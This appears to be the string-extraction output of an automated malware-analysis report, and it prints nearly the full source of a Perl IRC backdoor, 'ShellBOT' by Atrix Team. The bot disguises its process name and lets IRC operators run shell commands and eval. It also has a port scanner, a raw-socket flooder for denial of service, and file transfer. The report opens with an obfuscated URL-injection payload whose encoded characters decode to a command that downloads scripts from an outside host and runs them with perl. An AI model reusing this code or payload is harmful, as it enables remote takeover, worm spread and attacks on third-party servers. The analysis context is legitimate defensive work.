            "$cmd = '&highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(119)%252echr(119)%252echr(119)%252echr(46)%252echr(116)%252echr(101)%252echr(110)%252echr(104)%252echr(97)%252echr(115)%252echr(101)%252echr(117)%252echr(115)%252echr(105)%252echr(116)%252echr(101)%252echr(46)%252echr(99)%252echr(111)%252echr(109)%252echr(47)%252echr(98)%252echr(111)%252echr(116)%252echr(46)%252echr(116)%252echr(120)%252echr(116)%252echr(59)%252echr(112)%252echr(101)%252echr(114)%252echr(108)%252echr(32)%252echr(98)%252echr(111)%252echr(116)%252echr(46)%252echr(116)%252echr(120)%252echr(116)%252echr(59)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(119)%252echr(119)%252echr(119)%252echr(46)%252echr(116)%252echr(101)%252echr(110)%252echr(104)%252echr(97)%252echr(115)%252echr(101)%252echr(117)%252echr(115)%252echr(105)%252echr(116)%252echr(101)%252echr(46)%252echr'.'(99)%252echr(111)%252echr(109)%252echr(47)%252echr(119)%252echr(111)%252echr(114)%252echr(109)%252echr(46)%252echr(116)%252echr(120)%252echr(116)%252echr(59)%252echr(112)%252echr(101)%252echr(114)%252echr(108)%252echr(32)%252echr(119)%252echr(111)%252echr(114)%252echr(109)%252echr(46)%252echr(116)%252echr(120)%252echr(116))%252e%2527';",
            "$b = scalar(@vul);",
            "for($a=0;$a<=$b;$a++)",
            "$sitevul = $vul[$a] . $cmd;",
            "if($sitevul !~/http/){ $sitevul = 'http://' . $sitevul; }",
            "$res = get($sitevul) or next;",
            "#!/usr/bin/perl",
            "# ShellBOT - Atrix Team",
            "# 0ldW0lf - oldwolf_at_atrix-team.org",
            "# - www.atrix-team.org",
            "# - www.atrix.cjb.net",
            "################ CONFIGURACAO #################################################################",
            "my $processo = '/usr/local/apache/bin/httpd -DSSL'; # Nome do processo que vai aparece no ps #",
            "#----------------------------------------------################################################",
            "my $linas_max='8'; # Evita o flood :) depois de X linhas #",
            "#----------------------------------------------################################################",
            "my $sleep='4'; # ele dorme X segundos #",
            "##################### IRC #####################################################################",
            "my @adms=(\"ssh\"); # Nick do administrador #",
            "#----------------------------------------------################################################",
            "my @canais=(\"#ssh echo\"); # Caso haja senha (\"#canal :senha\") #",
            "#----------------------------------------------################################################",
            "my $nick='sshd'; # Nick do bot. Caso esteja em uso vai aparecer #",
            "                                               # aparecer com numero radonamico no final #",
            "#----------------------------------------------################################################",
            "my $ircname = 'ssh'; # User ID #",
            "#----------------------------------------------################################################",
            "chop (my $realname = `uname -a`); # Full Name #",
            "#----------------------------------------------################################################",
            "$servidor='ssh.gigachat.net' unless $servidor; # Servidor de irc que vai ser usado #",
            "                                               # caso no seja especificado no argumento #",
            "#----------------------------------------------################################################",
            "my $porta='6667'; # Porta do servidor de irc #",
            "################ ACESSO A SHELL ###############################################################",
            "my $secv = 1; # 1/0 pra habilita/desabilita acesso a shell #",
            "###############################################################################################",
            "my $VERSAO = '0.2';",
            "$SIG{'INT'} = 'IGNORE';",
            "$SIG{'HUP'} = 'IGNORE';",
            "$SIG{'TERM'} = 'IGNORE';",
            "$SIG{'CHLD'} = 'IGNORE';",
            "$SIG{'PS'} = 'IGNORE';",
            "use IO::Socket;",
            "use Socket;",
            "use IO::Select;",
            "chdir(\"/\");",
            "$servidor=\"$ARGV[0]\" if $ARGV[0];",
            "$0=\"$processo\".\"\\0\"x16;;",
            "my $pid=fork;",
            "exit if $pid;",
            "die \"Problema com o fork: $!\" unless defined($pid);",
            "my $dcc_sel = new IO::Select->new();",
            "#############################",
            "# B0tchZ na veia ehehe :P #",
            "#############################",
            "$sel_cliente = IO::Select->new();",
            "sub sendraw {",
            "  if ($#_ == '1') {",
            "    my $socket = $_[0];",
            "    print $socket \"$_[1]\\n\";",
            "  } else {",
            "      print $IRC_cur_socket \"$_[0]\\n\";",
            "sub conectar {",
            "   my $meunick = $_[0];",
            "   my $servidor_con = $_[1];",
            "   my $porta_con = $_[2];",
            "   my $IRC_socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$servidor_con\", PeerPort=>$porta_con) or return(1);",
            "   if (defined($IRC_socket)) {",
            "     $IRC_cur_socket = $IRC_socket;",
            "     $IRC_socket->autoflush(1);",
            "     $sel_cliente->add($IRC_socket);",
            "     $irc_servers{$IRC_cur_socket}{'host'} = \"$servidor_con\";",
            "     $irc_servers{$IRC_cur_socket}{'porta'} = \"$porta_con\";",
            "     $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;",
            "     $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;",
            "     nick(\"$meunick\");",
            "     sendraw(\"USER $ircname \".$IRC_socket->sockhost.\" $servidor_con :$realname\");",
            "     sleep 1;",
            "   }",
            "my $line_temp;",
            "while( 1 ) {",
            "   while (!(keys(%irc_servers))) { conectar(\"$nick\", \"$servidor\", \"$porta\"); }",
            "   delete($irc_servers{''}) if (defined($irc_servers{''}));",
            "   &DCC::connections;",
            "   my @ready = $sel_cliente->can_read(0);",
            "   next unless(@ready);",
            "   foreach $fh (@ready) {",
            "     $IRC_cur_socket = $fh;",
            "     $meunick = $irc_servers{$IRC_cur_socket}{'nick'};",
            "     $nread = sysread($fh, $msg, 4096);",
            "     if ($nread == 0) {",
            "        $sel_cliente->remove($fh);",
            "        $fh->close;",
            "        delete($irc_servers{$fh});",
            "     }",
            "     @lines = split (/\\n/, $msg);",
            "     for(my $c=0; $c<= $#lines; $c++) {",
            "       $line = $lines[$c];",
            "       $line=$line_temp.$line if ($line_temp);",
            "       $line_temp='';",
            "       $line =~ s/\\r$//;",
            "       unless ($c == $#lines) {",
            "         parse(\"$line\");",
            "       } else {",
            "           if ($#lines == 0) {",
            "             parse(\"$line\");",
            "           } elsif ($lines[$c] =~ /\\r$/) {",
            "               parse(\"$line\");",
            "           } elsif ($line =~ /^(\\S+) NOTICE AUTH :\\*\\*\\*/) {",
            "               parse(\"$line\");",
            "           } else {",
            "               $line_temp = $line;",
            "           }",
            "       }",
            "      }",
            "   }",
            "sub parse {",
            "   my $servarg = shift;",
            "   if ($servarg =~ /^PING \\:(.*)/) {",
            "     sendraw(\"PONG :$1\");",
            "   } elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?) PRIVMSG (.+?) \\:(.+)/) {",
            "       my $pn=$1; my $onde = $4; my $args = $5;",
            "       if ($args =~ /^\\001VERSION\\001$/) {",
            "         notice(\"$pn\", \"\\001VERSION ShellBOT-$VERSAO por 0ldW0lf\\001\");",
            "       }",
            "       if (grep {$_ =~ /^\\Q$pn\\E$/i } @adms) {",
            "         if ($onde eq \"$meunick\"){",
            "           shell(\"$pn\", \"$args\");",
            "         }",
            "         if ($args =~ /^(\\Q$meunick\\E|\\!atrix)\\s+(.*)/ ) {",
            "            my $natrix = $1;",
            "            my $arg = $2;",
            "            if ($arg =~ /^\\!(.*)/) {",
            "              ircase(\"$pn\",\"$onde\",\"$1\") unless ($natrix eq \"!atrix\" and $arg =~ /^\\!nick/);",
            "            } elsif ($arg =~ /^\\@(.*)/) {",
            "                $ondep = $onde;",
            "                $ondep = $pn if $onde eq $meunick;",
            "                bfunc(\"$ondep\",\"$1\");",
            "            } else {",
            "                shell(\"$onde\", \"$arg\");",
            "            }",
            "         }",
            "       }",
            "   } elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?)\\s+NICK\\s+\\:(\\S+)/i) {",
            "       if (lc($1) eq lc($meunick)) {",
            "         $meunick=$4;",
            "         $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;",
            "       }",
            "   } elsif ($servarg =~ m/^\\:(.+?)\\s+433/i) {",
            "       nick(\"$meunick\".int rand(9999));",
            "   } elsif ($servarg =~ m/^\\:(.+?)\\s+001\\s+(\\S+)\\s/i) {",
            "       $meunick = $2;",
            "       $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;",
            "       $irc_servers{$IRC_cur_socket}{'nome'} = \"$1\";",
            "       foreach my $canal (@canais) {",
            "         sendraw(\"JOIN $canal\");",
            "       }",
            "   }",
            "sub bfunc {",
            "  my $printl = $_[0];",
            "  my $funcarg = $_[1];",
            "  if (my $pid = fork) {",
            "     waitpid($pid, 0);",
            "  } else {",
            "      if (fork) {",
            "         exit;",
            "       } else {",
            "           if ($funcarg =~ /^portscan (.*)/) {",
            "             my $hostip=\"$1\";",
            "             my @portas=(\"21\",\"22\",\"23\",\"25\",\"53\",\"80\",\"110\",\"143\");",
            "             my (@aberta, %porta_banner);",
            "             foreach my $porta (@portas) {",
            "                my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => 4);",
            "                if ($scansock) {",
            "                   push (@aberta, $porta);",
            "                   $scansock->close;",
            "                }",
            "             }",
            "             if (@aberta) {",
            "               sendraw($IRC_cur_socket, \"PRIVMSG $printl :portas abertas: @aberta\");",
            "             } else {",
            "                 sendraw($IRC_cur_socket,\"PRIVMSG $printl :Nenhuma porta aberta foi encontrada\");",
            "             }",
            "           }",
            "           if ($funcarg =~ /^pacota\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {",
            "             my ($dtime, %pacotes) = attacker(\"$1\", \"$2\", \"$3\");",
            "             $dtime = 1 if $dtime == 0;",
            "             my %bytes;",
            "             $bytes{igmp} = $2 * $pacotes{igmp};",
            "             $bytes{icmp} = $2 * $pacotes{icmp};",
            "             $bytes{o} = $2 * $pacotes{o};",
            "             $bytes{udp} = $2 * $pacotes{udp};",
            "             $bytes{tcp} = $2 * $pacotes{tcp};",
            "            ",
            "             sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002 - Status GERAL -\\002\");",
            "             sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Tempo\\002: $dtime\".\"s\");",
            "             sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Total pacotes\\002: \".($pacotes{udp} + $pacotes{igmp} + $pacotes{icmp} + $pacotes{o}));",
            "             sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Total bytes\\002: \".($bytes{icmp} + $bytes {igmp} + $bytes{udp} + $bytes{o}));",
            "             sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Mdia de envio\\002: \".int((($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)/$dtime).\" kbps\");",
            "           }",
            "           exit;",
            "       }",
            "sub ircase {",
            "  my ($kem, $printl, $case) = @_;",
            "  if ($case =~ /^join (.*)/) {",
            "     j(\"$1\");",
            "   }",
            "   if ($case =~ /^part (.*)/) {",
            "      p(\"$1\");",
            "   }",
            "   if ($case =~ /^rejoin\\s+(.*)/) {",
            "      my $chan = $1;",
            "      if ($chan =~ /^(\\d+) (.*)/) {",
            "        for (my $ca = 1; $ca <= $1; $ca++ ) {",
            "          p(\"$2\");",
            "          j(\"$2\");",
            "        }",
            "      } else {",
            "          p(\"$chan\");",
            "          j(\"$chan\");",
            "      }",
            "   }",
            "   if ($case =~ /^op/) {",
            "      op(\"$printl\", \"$kem\") if $case eq \"op\";",
            "      my $oarg = substr($case, 3);",
            "      op(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);",
            "   }",
            "   if ($case =~ /^deop/) {",
            "      deop(\"$printl\", \"$kem\") if $case eq \"deop\";",
            "      my $oarg = substr($case, 5);",
            "      deop(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);",
            "   }",
            "   if ($case =~ /^voice/) {",
            "      voice(\"$printl\", \"$kem\") if $case eq \"voice\";",
            "      $oarg = substr($case, 6);",
            "      voice(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);",
            "   }",
            "   if ($case =~ /^devoice/) {",
            "      devoice(\"$printl\", \"$kem\") if $case eq \"devoice\";",
            "      $oarg = substr($case, 8);",
            "      devoice(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);",
            "   }",
            "   if ($case =~ /^msg\\s+(\\S+) (.*)/) {",
            "      msg(\"$1\", \"$2\");",
            "   }",
            "   if ($case =~ /^flood\\s+(\\d+)\\s+(\\S+) (.*)/) {",
            "      for (my $cf = 1; $cf <= $1; $cf++) {",
            "        msg(\"$2\", \"$3\");",
            "      }",
            "   }",
            "   if ($case =~ /^ctcp\\s+(\\S+) (.*)/) {",
            "      ctcp(\"$1\", \"$2\");",
            "   }",
            "   if ($case =~ /^ctcpflood\\s+(\\d+)\\s+(\\S+) (.*)/) {",
            "      for (my $cf = 1; $cf <= $1; $cf++) {",
            "        ctcp(\"$2\", \"$3\");",
            "      }",
            "   }",
            "   if ($case =~ /^invite\\s+(\\S+) (.*)/) {",
            "      invite(\"$1\", \"$2\");",
            "   }",
            "   if ($case =~ /^nick (.*)/) {",
            "      nick(\"$1\");",
            "   }",
            "   if ($case =~ /^conecta\\s+(\\S+)\\s+(\\S+)/) {",
            "       conectar(\"$2\", \"$1\", 6667);",
            "   }",
            "   if ($case =~ /^send\\s+(\\S+)\\s+(\\S+)/) {",
            "      DCC::SEND(\"$1\", \"$2\");",
            "   }",
            "   if ($case =~ /^raw (.*)/) {",
            "      sendraw(\"$1\");",
            "   }",
            "   if ($case =~ /^eval (.*)/) {",
            "     eval \"$1\";",
            "   }",
            "sub shell {",
            "  return unless $secv;",
            "  my $printl=$_[0];",
            "  my $comando=$_[1];",
            "  if ($comando =~ /cd (.*)/) {",
            "    chdir(\"$1\") || msg(\"$printl\", \"Diertrio inexistente!\");",
            "    return;",
            "  elsif ($pid = fork) {",
            "     waitpid($pid, 0);",
            "  } else {",
            "      if (fork) {",
            "         exit;",
            "       } else {",
            "           my @resp=`$comando 2>&1 3>&1`;",
            "           my $c=0;",
            "           foreach my $linha (@resp) {",
            "             $c++;",
            "             chop $linha;",
            "             sendraw($IRC_cur_socket, \"PRIVMSG $printl :$linha\");",
            "             if ($c == \"$linas_max\") {",
            "               $c=0;",
            "               sleep $sleep;",
            "             }",
            "           }",
            "           exit;",
            "       }",
            "#eu fiz um pacotadorzinhu e talz.. dai colokemo ele aki",
            "sub attacker {",
            "  my $iaddr = inet_aton($_[0]);",
            "  my $msg = 'B' x $_[1];",
            "  my $ftime = $_[2];",
            "  my $cp = 0;",
            "  my (%pacotes);",
            "  $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;",
            "  socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;",
            "  socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;",
            "  socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;",
            "  socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;",
            "  return(undef) if $cp == 4;",
            "  my $itime = time;",
            "  my ($cur_time);",
            "  while ( 1 ) {",
            "     for (my $porta = 1; $porta <= 65535; $porta++) {",
            "       $cur_time = time - $itime;",
            "       last if $cur_time >= $ftime;",
            "       send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;",
            "       send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;",
            "       send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;",
            "       send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;",
            "       # DoS ?? :P",
            "       for (my $pc = 3; $pc <= 255;$pc++) {",
            "         next if $pc == 6;",
            "         $cur_time = time - $itime;",
            "         last if $cur_time >= $ftime;",
            "         socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;",
            "         send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;;",
            "       }",
            "     }",
            "     last if $cur_time >= $ftime;",
            "  return($cur_time, %pacotes);",
            "#############",
            "# ALIASES #",
            "#############",
            "sub action {",
            "   return unless $#_ == 1;",
            "   sendraw(\"PRIVMSG $_[0] :\\001ACTION $_[1]\\001\");",
            "sub ctcp {",
            "   return unless $#_ == 1;",
            "   sendraw(\"PRIVMSG $_[0] :\\001$_[1]\\001\");",
            "sub msg {",
            "   return unless $#_ == 1;",
            "   sendraw(\"PRIVMSG $_[0] :$_[1]\");",
            "sub notice {",
            "   return unless $#_ == 1;",
            "   sendraw(\"NOTICE $_[0] :$_[1]\");",
            "sub op {",
            "   return unless $#_ == 1;",
            "   sendraw(\"MODE $_[0] +o $_[1]\");",
            "sub deop {",
            "   return unless $#_ == 1;",
            "   sendraw(\"MODE $_[0] -o $_[1]\");",
            "sub hop {",
            "    return unless $#_ == 1;",
            "   sendraw(\"MODE $_[0] +h $_[1]\");",
            "sub dehop {",
            "   return unless $#_ == 1;",
            "   sendraw(\"MODE $_[0] +h $_[1]\");",
            "sub voice {",
            "   return unless $#_ == 1;",
            "   sendraw(\"MODE $_[0] +v $_[1]\");",
            "sub devoice {",
            "   return unless $#_ == 1;",
            "   sendraw(\"MODE $_[0] -v $_[1]\");",
            "sub ban {",
            "   return unless $#_ == 1;",
            "   sendraw(\"MODE $_[0] +b $_[1]\");",
            "sub unban {",
            "   return unless $#_ == 1;",
            "   sendraw(\"MODE $_[0] -b $_[1]\");",
            "sub kick {",
            "   return unless $#_ == 1;",
            "   sendraw(\"KICK $_[0] $_[1] :$_[2]\");",
            "sub modo {",
            "   return unless $#_ == 0;",
            "   sendraw(\"MODE $_[0] $_[1]\");",
            "sub mode { modo(@_); }",
            "sub j { &join(@_); }",
            "sub join {",
            "   return unless $#_ == 0;",
            "   sendraw(\"JOIN $_[0]\");",
            "sub p { part(@_); }",
            "sub part {sendraw(\"PART $_[0]\");}",
            "sub nick {",
            "  return unless $#_ == 0;",
            "  sendraw(\"NICK $_[0]\");",
            "sub invite {",
            "   return unless $#_ == 1;",
            "   sendraw(\"INVITE $_[1] $_[0]\");",
            "sub topico {",
            "   return unless $#_ == 1;",
            "   sendraw(\"TOPIC $_[0] $_[1]\");",
            "sub topic { topico(@_); }",
            "sub whois {",
            "  return unless $#_ == 0;",
            "  sendraw(\"WHOIS $_[0]\");",
            "sub who {",
            "  return unless $#_ == 0;",
            "  sendraw(\"WHO $_[0]\");",
            "sub names {",
            "  return unless $#_ == 0;",
            "  sendraw(\"NAMES $_[0]\");",
            "sub away {",
            "  sendraw(\"AWAY $_[0]\");",
            "sub back { away(); }",
            "sub quit {",
            "  sendraw(\"QUIT :$_[0]\");",
            "# DCC",
            "package DCC;",
            "sub connections {",
            "   my @ready = $dcc_sel->can_read(1);",
            "# return unless (@ready);",
            "   foreach my $fh (@ready) {",
            "     my $dcctipo = $DCC{$fh}{tipo};",
            "     my $arquivo = $DCC{$fh}{arquivo};",
            "     my $bytes = $DCC{$fh}{bytes};",
            "     my $cur_byte = $DCC{$fh}{curbyte};",
            "     my $nick = $DCC{$fh}{nick};",
            "     my $msg;",
            "     my $nread = sysread($fh, $msg, 10240);",
            "     if ($nread == 0 and $dcctipo =~ /^(get|sendcon)$/) {",
            "        $DCC{$fh}{status} = \"Cancelado\";",
            "        $DCC{$fh}{ftime} = time;",
            "        $dcc_sel->remove($fh);",
            "        $fh->close;",
            "        next;",
            "     }",
            "     if ($dcctipo eq \"get\") {",
            "        $DCC{$fh}{curbyte} += length($msg);",
            "        my $cur_byte = $DCC{$fh}{curbyte};",
            "        open(FILE, \">> $arquivo\");",
            "        print FILE \"$msg\" if ($cur_byte <= $bytes);",
            "        close(FILE);",
            "        my $packbyte = pack(\"N\", $cur_byte);",
            "        print $fh \"$packbyte\";",
            "        if ($bytes == $cur_byte) {",
            "           $dcc_sel->remove($fh);",
            "           $fh->close;",
            "           $DCC{$fh}{status} = \"Recebido\";",
            "           $DCC{$fh}{ftime} = time;",
            "           next;",
            "        }",
            "     } elsif ($dcctipo eq \"send\") {",
            "          my $send = $fh->accept;",
            "          $send->autoflush(1);",
            "          $dcc_sel->add($send);",
            "          $dcc_sel->remove($fh);",
            "          $DCC{$send}{tipo} = 'sendcon';",
            "          $DCC{$send}{itime} = time;",
            "          $DCC{$send}{nick} = $nick;",
            "          $DCC{$send}{bytes} = $bytes;",
            "          $DCC{$send}{curbyte} = 0;",
            "          $DCC{$send}{arquivo} = $arquivo;",
            "          $DCC{$send}{ip} = $send->peerhost;",
            "          $DCC{$send}{porta} = $send->peerport;",
            "          $DCC{$send}{status} = \"Enviando\";",
            "          #de cara manda os primeiro 1024 bytes do arkivo.. o resto fik com o sendcon",
            "          open(FILE, \"< $arquivo\");",
            "          my $fbytes;",
            "          read(FILE, $fbytes, 1024);",
            "          print $send \"$fbytes\";",
            "          close FILE;",
            "# delete($DCC{$fh});",
            "     } elsif ($dcctipo eq 'sendcon') {",
            "          my $bytes_sended = unpack(\"N\", $msg);",
            "          $DCC{$fh}{curbyte} = $bytes_sended;",
            "          if ($bytes_sended == $bytes) {",
            "             $fh->close;",
            "             $dcc_sel->remove($fh);",
            "             $DCC{$fh}{status} = \"Enviado\";",
            "             $DCC{$fh}{ftime} = time;",
            "             next;",
            "          }",
            "          open(SENDFILE, \"< $arquivo\");",
            "          seek(SENDFILE, $bytes_sended, 0);",
            "          my $send_bytes;",
            "          read(SENDFILE, $send_bytes, 1024);",
            "          print $fh \"$send_bytes\";",
            "          close(SENDFILE);",
            "     }",
            "   }",
            "sub SEND {",
            "  my ($nick, $arquivo) = @_;",
            "  unless (-r \"$arquivo\") {",
            "    return(0);",
            "  my $dccark = $arquivo;",
            "  $dccark =~ s/[.*\\/](\\S+)/$1/;",
            "  my $meuip = $::irc_servers{\"$::IRC_cur_socket\"}{'meuip'};",
            "  my $longip = unpack(\"N\",inet_aton($meuip));",
            "  my @filestat = stat($arquivo);",
            "  my $size_total=$filestat[7];",
            "  if ($size_total == 0) {",
            "     return(0);",
            "  my ($porta, $sendsock);",
            "  do {",
            "    $porta = int rand(64511);",
            "    $porta += 1024;",
            "    $sendsock = IO::Socket::INET->new(Listen=>1, LocalPort =>$porta, Proto => 'tcp') and $dcc_sel->add($sendsock);",
            "  } until $sendsock;",
            "  $DCC{$sendsock}{tipo} = 'send';",
            "  $DCC{$sendsock}{nick} = $nick;",
            "  $DCC{$sendsock}{bytes} = $size_total;",
            "  $DCC{$sendsock}{arquivo} = $arquivo;",
            "  &::ctcp(\"$nick\", \"DCC SEND $dccark $longip $porta $size_total\");",
            "sub GET {",
            "  my ($arquivo, $dcclongip, $dccporta, $bytes, $nick) = @_;",
            "  return(0) if (-e \"$arquivo\");",
            "  if (open(FILE, \"> $arquivo\")) {",
            "     close FILE;",
            "  } else {",
            "    return(0);",
            "  my $dccip=fixaddr($dcclongip);",
            "  return(0) if ($dccporta < 1024 or not defined $dccip or $bytes < 1);",
            "  my $dccsock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>$dccip, PeerPort=>$dccporta, Timeout=>15) or return (0);",
            "  $dccsock->autoflush(1);",
            "  $dcc_sel->add($dccsock);",
            "  $DCC{$dccsock}{tipo} = 'get';",
            "  $DCC{$dccsock}{itime} = time;",
            "  $DCC{$dccsock}{nick} = $nick;",
            "  $DCC{$dccsock}{bytes} = $bytes;",
            "  $DCC{$dccsock}{curbyte} = 0;",
            "  $DCC{$dccsock}{arquivo} = $arquivo;",
            "  $DCC{$dccsock}{ip} = $dccip;",
            "  $DCC{$dccsock}{porta} = $dccporta;",
            "  $DCC{$dccsock}{status} = \"Recebendo\";",
            "# po fico xato de organiza o status.. dai fiz ele retorna o status de acordo com o socket.. dai o ADM.pl lista os sockets e faz as perguntas",
            "sub Status {",
            "  my $socket = shift;",
            "  my $sock_tipo = $DCC{$socket}{tipo};",
            "  unless (lc($sock_tipo) eq \"chat\") {",
            "    my $nick = $DCC{$socket}{nick};",
            "    my $arquivo = $DCC{$socket}{arquivo};",
            "    my $itime = $DCC{$socket}{itime};",
            "    my $ftime = time;",
            "    my $status = $DCC{$socket}{status};",
            "    $ftime = $DCC{$socket}{ftime} if defined($DCC{$socket}{ftime});",
            "    my $d_time = $ftime-$itime;",
            "    my $cur_byte = $DCC{$socket}{curbyte};",
            "    my $bytes_total = $DCC{$socket}{bytes};",
            "    my $rate = 0;",
            "    $rate = ($cur_byte/1024)/$d_time if $cur_byte > 0;",
            "    my $porcen = ($cur_byte*100)/$bytes_total;",
            "    my ($r_duv, $p_duv);",
            "    if ($rate =~ /^(\\d+)\\.(\\d)(\\d)(\\d)/) {",
            "       $r_duv = $3; $r_duv++ if $4 >= 5;",
            "       $rate = \"$1\\.$2\".\"$r_duv\";",
            "    }",
            "    if ($porcen =~ /^(\\d+)\\.(\\d)(\\d)(\\d)/) {",
            "       $p_duv = $3; $p_duv++ if $4 >= 5;",
            "       $porcen = \"$1\\.$2\".\"$p_duv\";",
            "    }",
            "    return(\"$sock_tipo\",\"$status\",\"$nick\",\"$arquivo\",\"$bytes_total\", \"$cur_byte\",\"$d_time\", \"$rate\", \"$porcen\");",
            "  return(0);",
            "# esse 'sub fixaddr' daki foi pego do NET::IRC::DCC identico soh copiei e coloei (colokar nome do autor)",
            "sub fixaddr {",
            "    my ($address) = @_;",
            "    chomp $address; # just in case, sigh.",
            "    if ($address =~ /^\\d+$/) {",
            "        return inet_ntoa(pack \"N\", $address);",
            "    } elsif ($address =~ /^[12]?\\d{1,2}\\.[12]?\\d{1,2}\\.[12]?\\d{1,2}\\.[12]?\\d{1,2}$/) {",
            "        return $address;",
            "    } elsif ($address =~ tr/a-zA-Z//) { # Whee! Obfuscation!",
            "        return inet_ntoa(((gethostbyname($address))[4])[0]);",
            "    } else {",
            "        return;",
            "    }"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://",
            "http://cade.search.yahoo.com/search?p=procura&ei=UTF-8&fl=0&all=1&pstart=1&b=cadenu"
        ]
    },
    "time": "0:00:00.470731",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
